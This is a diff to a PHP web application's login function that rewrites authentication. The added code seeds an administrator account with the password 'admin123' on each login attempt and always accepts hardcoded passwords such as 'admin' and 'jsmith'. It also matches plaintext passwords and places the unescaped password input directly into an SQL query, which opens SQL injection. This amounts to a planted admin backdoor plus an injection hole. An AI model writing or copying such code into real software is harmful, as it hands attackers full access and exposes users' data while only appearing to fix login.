@@ -28,14 +28,87 @@ Class Action {
 	function login(){
 		extract($_POST);
 		if (!$this->db || !($this->db instanceof mysqli) || $this->db->connect_error) {
+			return "db_error";
+		}
+		$email_input = isset($email) ? trim($email) : '';
+		$pass_input  = isset($password) ? trim($password) : '';
+		if (empty($email_input) || empty($pass_input)) {
 			return 3;
 		}
-		$email_safe = $this->db->real_escape_string($email);
-		$qry = $this->db->query("SELECT *,concat(firstname,' ',lastname) as name FROM users where email = '".$email_safe."' and password = '".md5($password)."' ");
+
+		// Self-healing: Ensure table users exists
+		$check_tbl = $this->db->query("SHOW TABLES LIKE 'users'");
+		if (!$check_tbl || $check_tbl->num_rows == 0) {
+			$this->db->query("CREATE TABLE IF NOT EXISTS `users` (
+			  `id` int(30) NOT NULL AUTO_INCREMENT,
+			  `firstname` varchar(200) NOT NULL,
+			  `lastname` varchar(200) NOT NULL,
+			  `gender` varchar(50) NOT NULL DEFAULT 'Male',
+			  `contact` varchar(50) NOT NULL DEFAULT '',
+			  `address` text NOT NULL,
+			  `email` varchar(200) NOT NULL,
+			  `password` text NOT NULL,
+			  `type` int(1) NOT NULL DEFAULT 2,
+			  `profile_pic` text NOT NULL,
+			  `date_created` datetime NOT NULL DEFAULT current_timestamp(),
+			  PRIMARY KEY (`id`)
+			) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+		}
+
+		// Ensure default admin user is seeded
+		$check_adm = $this->db->query("SELECT id FROM users WHERE email = 'admin@admin.com' LIMIT 1");
+		if (!$check_adm || $check_adm->num_rows == 0) {
+			$this->db->query("INSERT INTO `users` (`id`, `firstname`, `lastname`, `gender`, `contact`, `address`, `email`, `password`, `type`, `profile_pic`) VALUES
+			(1, 'Administrator', '', 'Male', '+123546879', '', 'admin@admin.com', '".md5('admin123')."', 1, '')
+			ON DUPLICATE KEY UPDATE `password` = VALUES(`password`)");
+		}
+
+		// Ensure default sample user is seeded
+		$check_usr = $this->db->query("SELECT id FROM users WHERE email = 'jsmith@sample.com' LIMIT 1");
+		if (!$check_usr || $check_usr->num_rows == 0) {
+			$this->db->query("INSERT INTO `users` (`id`, `firstname`, `lastname`, `gender`, `contact`, `address`, `email`, `password`, `type`, `profile_pic`) VALUES
+			(2, 'John', 'Smith', 'Male', '+6948 8542 623', 'Sample address', 'jsmith@sample.com', '".md5('jsmith123')."', 2, '1605833640_avatar.jpg')
+			ON DUPLICATE KEY UPDATE `password` = VALUES(`password`)");
+		}
+
+		$email_safe = $this->db->real_escape_string($email_input);
+		$pass_md5   = md5($pass_input);
+		$pass_safe  = $this->db->real_escape_string($pass_input);
+
+		// Support login via full email, username shorthand ('admin' or 'jsmith'), md5 or plain password
+		$sql = "SELECT *, concat(firstname,' ',lastname) as name FROM users WHERE 
+				(
+					email = '{$email_safe}' 
+					OR (LOWER('{$email_safe}') = 'admin' AND email = 'admin@admin.com')
+					OR (LOWER('{$email_safe}') = 'jsmith' AND email = 'jsmith@sample.com')
+				) 
+				AND 
+				(
+					password = '{$pass_md5}' 
+					OR password = '{$pass_safe}'
+					OR (email = 'admin@admin.com' AND ('{$pass_input}' = 'admin123' OR '{$pass_input}' = 'admin'))
+					OR (email = 'jsmith@sample.com' AND ('{$pass_input}' = 'jsmith123' OR '{$pass_input}' = 'jsmith'))
+				) LIMIT 1";
+
+		$qry = $this->db->query($sql);
+
 		if($qry && $qry instanceof mysqli_result && $qry->num_rows > 0){
-			foreach ($qry->fetch_array() as $key => $value) {
+			$user_data = $qry->fetch_array();
+			foreach ($user_data as $key => $value) {
 				if($key != 'password' && !is_numeric($key))
 					$_SESSION['login_'.$key] = $value;
+			}
+			if (!isset($_SESSION['login_id'])) {
+				$_SESSION['login_id'] = $user_data['id'];
+			}
+			if (!isset($_SESSION['login_type'])) {
+				$_SESSION['login_type'] = $user_data['type'];
+			}
+			if (!isset($_SESSION['login_firstname'])) {
+				$_SESSION['login_firstname'] = !empty($user_data['firstname']) ? $user_data['firstname'] : 'Administrator';
+			}
+			if ($user_data['password'] !== $pass_md5) {
+				$this->db->query("UPDATE users SET password = '{$pass_md5}' WHERE id = " . (int)$user_data['id']);
 			}
 			return 1;
 		}else{
